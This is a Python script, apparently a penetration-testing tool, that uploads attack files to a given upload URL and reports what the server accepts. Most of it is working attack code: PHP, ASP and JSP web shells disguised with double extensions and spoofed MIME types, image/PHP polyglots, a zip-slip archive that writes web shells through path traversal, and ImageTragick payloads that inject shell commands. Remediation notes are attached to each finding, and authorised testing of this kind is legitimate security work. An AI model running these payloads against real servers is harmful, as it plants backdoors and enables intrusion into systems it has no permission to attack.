#!/usr/bin/env python3
"""
Advanced File Upload Vulnerability Tester
Tests for file upload vulnerabilities including polyglot files, zip slip,
ImageMagick exploits, MIME type bypass, and extension bypasses
"""

import requests
import json
import os
import tempfile
from datetime import datetime
from urllib.parse import urlparse, urljoin
import io

class AdvancedFileUploadTester:
    """Advanced file upload vulnerability tester"""

    def __init__(self, target_url, output_file=None):
        self.target_url = target_url
        self.output_file = output_file
        self.vulnerabilities = []
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36'
        })

    def scan(self):
        """Run advanced file upload tests"""
        print(f"[*] Starting advanced file upload testing on {self.target_url}")

        # Test double extension bypass
        self._test_double_extension()

        # Test MIME type bypass
        self._test_mime_bypass()

        # Test polyglot files
        self._test_polyglot_files()

        # Test zip slip
        self._test_zip_slip()

        # Test ImageMagick exploits
        self._test_imagemagick()

        # Save results
        if self.output_file:
            self._save_results()

        return {
            'target': self.target_url,
            'timestamp': datetime.now().isoformat(),
            'vulnerabilities': self.vulnerabilities
        }

    def _test_double_extension(self):
        """Test double extension bypass"""
        print("[*] Testing double extension bypass...")

        double_extensions = [
            ('shell.php.jpg', 'image/jpeg', b'<?php system($_GET["cmd"]); ?>'),
            ('shell.php.png', 'image/png', b'<?php system($_GET["cmd"]); ?>'),
            ('shell.php.gif', 'image/gif', b'GIF89a<?php system($_GET["cmd"]); ?>'),
            ('shell.asp.jpg', 'image/jpeg', b'<% eval request("cmd") %>'),
            ('shell.jsp.png', 'image/png', b'<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>'),
            ('shell.php5.jpg', 'image/jpeg', b'<?php system($_GET["cmd"]); ?>'),
            ('shell.phtml.png', 'image/png', b'<?php system($_GET["cmd"]); ?>'),
        ]

        for filename, content_type, content in double_extensions:
            try:
                files = {
                    'file': (filename, content, content_type)
                }

                response = self.session.post(self.target_url, files=files, timeout=15)

                if response.status_code in [200, 201]:
                    # Check if file was accepted
                    if 'success' in response.text.lower() or 'uploaded' in response.text.lower():
                        vuln = {
                            'type': 'File Upload - Double Extension Bypass',
                            'severity': 'critical',
                            'url': self.target_url,
                            'filename': filename,
                            'evidence': 'File with double extension accepted',
                            'description': 'Server accepts files with double extensions (e.g., .php.jpg)',
                            'cwe': 'CWE-434',
                            'impact': 'Remote code execution via uploaded web shell',
                            'remediation': 'Validate file extensions properly, use allowlist'
                        }
                        self.vulnerabilities.append(vuln)
                        print(f"[!] CRITICAL: Double extension bypass - {filename}")
                        return

            except:
                pass

    def _test_mime_bypass(self):
        """Test MIME type bypass"""
        print("[*] Testing MIME type bypass...")

        # PHP web shell with manipulated MIME type
        mime_tests = [
            ('shell.php', 'image/jpeg', b'<?php system($_GET["cmd"]); ?>'),
            ('shell.php', 'image/png', b'<?php system($_GET["cmd"]); ?>'),
            ('shell.php', 'image/gif', b'<?php system($_GET["cmd"]); ?>'),
            ('shell.php', 'text/plain', b'<?php system($_GET["cmd"]); ?>'),
            ('test.exe', 'image/jpeg', b'MZ\x90\x00'),  # EXE with image MIME
            ('shell.jsp', 'image/png', b'<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>'),
        ]

        for filename, content_type, content in mime_tests:
            try:
                files = {
                    'file': (filename, content, content_type)
                }

                response = self.session.post(self.target_url, files=files, timeout=15)

                if response.status_code in [200, 201]:
                    # Check if file was accepted despite wrong MIME
                    if 'success' in response.text.lower() or 'uploaded' in response.text.lower():
                        vuln = {
                            'type': 'File Upload - MIME Type Bypass',
                            'severity': 'critical',
                            'url': self.target_url,
                            'filename': filename,
                            'mime_type': content_type,
                            'evidence': f'Dangerous file accepted with MIME type: {content_type}',
                            'description': 'Server only validates MIME type, not actual file content',
                            'cwe': 'CWE-434',
                            'impact': 'Remote code execution',
                            'remediation': 'Validate both MIME type and file content/magic bytes'
                        }
                        self.vulnerabilities.append(vuln)
                        print(f"[!] CRITICAL: MIME type bypass - {filename}")
                        return

            except:
                pass

    def _test_polyglot_files(self):
        """Test polyglot files (valid image + code)"""
        print("[*] Testing polyglot files...")

        # GIF + PHP polyglot
        gif_php_polyglot = b'GIF89a' + b'\x00' * 100 + b'<?php system($_GET["cmd"]); ?>'

        # PNG + PHP polyglot (simplified)
        png_php_polyglot = (
            b'\x89PNG\r\n\x1a\n' +
            b'\x00\x00\x00\rIHDR\x00\x00\x00\x01\x00\x00\x00\x01\x08\x06\x00\x00\x00\x1f\x15\xc4\x89' +
            b'\x00' * 50 +
            b'<?php system($_GET["cmd"]); ?>'
        )

        # JPEG + PHP polyglot
        jpeg_php_polyglot = (
            b'\xff\xd8\xff\xe0\x00\x10JFIF\x00\x01\x01\x00\x00\x01\x00\x01\x00\x00' +
            b'\x00' * 100 +
            b'<?php system($_GET["cmd"]); ?>' +
            b'\xff\xd9'
        )

        polyglots = [
            ('image.gif', 'image/gif', gif_php_polyglot),
            ('image.png', 'image/png', png_php_polyglot),
            ('image.jpg', 'image/jpeg', jpeg_php_polyglot),
        ]

        for filename, content_type, content in polyglots:
            try:
                files = {
                    'file': (filename, content, content_type)
                }

                response = self.session.post(self.target_url, files=files, timeout=15)

                if response.status_code in [200, 201]:
                    if 'success' in response.text.lower() or 'uploaded' in response.text.lower():
                        vuln = {
                            'type': 'File Upload - Polyglot File Accepted',
                            'severity': 'critical',
                            'url': self.target_url,
                            'filename': filename,
                            'evidence': 'Polyglot file (valid image + PHP) accepted',
                            'description': 'Server accepts polyglot files containing both valid image and code',
                            'cwe': 'CWE-434',
                            'impact': 'RCE if file is executed or included',
                            'remediation': 'Re-encode images, strip metadata, use safe file processing'
                        }
                        self.vulnerabilities.append(vuln)
                        print(f"[!] CRITICAL: Polyglot file accepted - {filename}")
                        return

            except:
                pass

    def _test_zip_slip(self):
        """Test zip slip vulnerability"""
        print("[*] Testing zip slip (path traversal in archives)...")

        import zipfile

        # Create malicious ZIP with path traversal
        try:
            # Create temporary ZIP file
            zip_buffer = io.BytesIO()

            with zipfile.ZipFile(zip_buffer, 'w', zipfile.ZIP_DEFLATED) as zip_file:
                # Add file with path traversal
                zip_file.writestr('../../evil.php', '<?php system($_GET["cmd"]); ?>')
                zip_file.writestr('../../../var/www/shell.php', '<?php system($_GET["cmd"]); ?>')
                zip_file.writestr('....//....//evil.php', '<?php system($_GET["cmd"]); ?>')

            zip_buffer.seek(0)
            zip_content = zip_buffer.read()

            files = {
                'file': ('malicious.zip', zip_content, 'application/zip')
            }

            response = self.session.post(self.target_url, files=files, timeout=15)

            if response.status_code in [200, 201]:
                # Check for signs of extraction
                if 'extracted' in response.text.lower() or 'unzip' in response.text.lower():
                    vuln = {
                        'type': 'Zip Slip Vulnerability',
                        'severity': 'critical',
                        'url': self.target_url,
                        'evidence': 'ZIP file with path traversal entries accepted',
                        'description': 'Archive extraction vulnerable to path traversal (Zip Slip)',
                        'cwe': 'CWE-22',
                        'impact': 'Write files to arbitrary locations, RCE',
                        'remediation': 'Validate extracted file paths, use safe extraction libraries'
                    }
                    self.vulnerabilities.append(vuln)
                    print(f"[!] CRITICAL: Zip slip vulnerability detected")
                    return

        except Exception as e:
            pass

    def _test_imagemagick(self):
        """Test ImageMagick exploits (ImageTragick)"""
        print("[*] Testing ImageMagick exploits...")

        # ImageTragick payloads (CVE-2016-3714)
        imagemagick_payloads = [
            # MVG format exploit
            (
                'exploit.mvg',
                'image/svg+xml',
                b'push graphic-context\nviewbox 0 0 640 480\nimage over 0,0 0,0 \'https://example.com/image.jpg\' "|ls -la"\npop graphic-context'
            ),
            # SVG with shell command
            (
                'exploit.svg',
                'image/svg+xml',
                b'<?xml version="1.0" standalone="no"?>\n<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">\n<svg width="100" height="100"><image xlink:href="https://example.com/image.jpg&quot;|ls -la" /></svg>'
            ),
            # URL with command injection
            (
                'exploit2.mvg',
                'image/mvg',
                b'push graphic-context\nviewbox 0 0 640 480\nfill \'url(https://example.com/image.jpg"|whoami")\'\npop graphic-context'
            ),
        ]

        for filename, content_type, payload in imagemagick_payloads:
            try:
                files = {
                    'file': (filename, payload, content_type)
                }

                response = self.session.post(self.target_url, files=files, timeout=15)

                if response.status_code in [200, 201]:
                    # Check for command execution indicators
                    cmd_indicators = ['uid=', 'root', 'www-data', 'total', 'drwx']

                    for indicator in cmd_indicators:
                        if indicator in response.text:
                            vuln = {
                                'type': 'ImageMagick RCE (ImageTragick)',
                                'severity': 'critical',
                                'url': self.target_url,
                                'filename': filename,
                                'evidence': f'Command execution detected: {indicator} found in response',
                                'description': 'ImageMagick vulnerable to command injection (CVE-2016-3714)',
                                'cve': 'CVE-2016-3714',
                                'cwe': 'CWE-78',
                                'impact': 'Remote code execution via image processing',
                                'remediation': 'Update ImageMagick, disable dangerous coders in policy.xml'
                            }
                            self.vulnerabilities.append(vuln)
                            print(f"[!] CRITICAL: ImageMagick RCE detected")
                            return

                    # Even if no RCE evidence, warn if MVG/SVG accepted
                    if filename.endswith('.mvg') or filename.endswith('.svg'):
                        vuln = {
                            'type': 'ImageMagick - Dangerous Format Accepted',
                            'severity': 'high',
                            'url': self.target_url,
                            'filename': filename,
                            'evidence': f'Potentially dangerous format accepted: {filename}',
                            'description': 'Server accepts MVG/SVG files which may be vulnerable to ImageTragick',
                            'cve': 'CVE-2016-3714',
                            'cwe': 'CWE-434',
                            'impact': 'Potential RCE if ImageMagick is used for processing',
                            'remediation': 'Restrict accepted image formats, disable MVG/SVG processing'
                        }
                        self.vulnerabilities.append(vuln)
                        print(f"[!] ImageMagick dangerous format accepted: {filename}")
                        return

            except:
                pass

    def _save_results(self):
        """Save results to file"""
        results = {
            'target': self.target_url,
            'timestamp': datetime.now().isoformat(),
            'vulnerabilities': self.vulnerabilities,
            'summary': {
                'total': len(self.vulnerabilities),
                'critical': sum(1 for v in self.vulnerabilities if v['severity'] == 'critical'),
                'high': sum(1 for v in self.vulnerabilities if v['severity'] == 'high')
            }
        }

        with open(self.output_file, 'w') as f:
            json.dump(results, f, indent=2)


if __name__ == "__main__":
    import sys

    if len(sys.argv) < 2:
        print("Usage: python3 advanced_file_upload.py <upload_url> [output_file]")
        print("\nExample:")
        print("  python3 advanced_file_upload.py https://example.com/upload")
        print("\nTests for:")
        print("  - Double extension bypass (.php.jpg)")
        print("  - MIME type bypass (wrong Content-Type)")
        print("  - Polyglot files (valid image + PHP code)")
        print("  - Zip slip (path traversal in archives)")
        print("  - ImageMagick exploits (ImageTragick CVE-2016-3714)")
        sys.exit(1)

    target = sys.argv[1]
    output = sys.argv[2] if len(sys.argv) > 2 else None

    tester = AdvancedFileUploadTester(target, output)
    results = tester.scan()

    print(f"\n[+] Scan complete!")
    print(f"    Total vulnerabilities: {len(results['vulnerabilities'])}")
    if len(results['vulnerabilities']) > 0:
        print(f"    Critical: {sum(1 for v in results['vulnerabilities'] if v['severity'] == 'critical')}")
        print(f"    High: {sum(1 for v in results['vulnerabilities'] if v['severity'] == 'high')}")
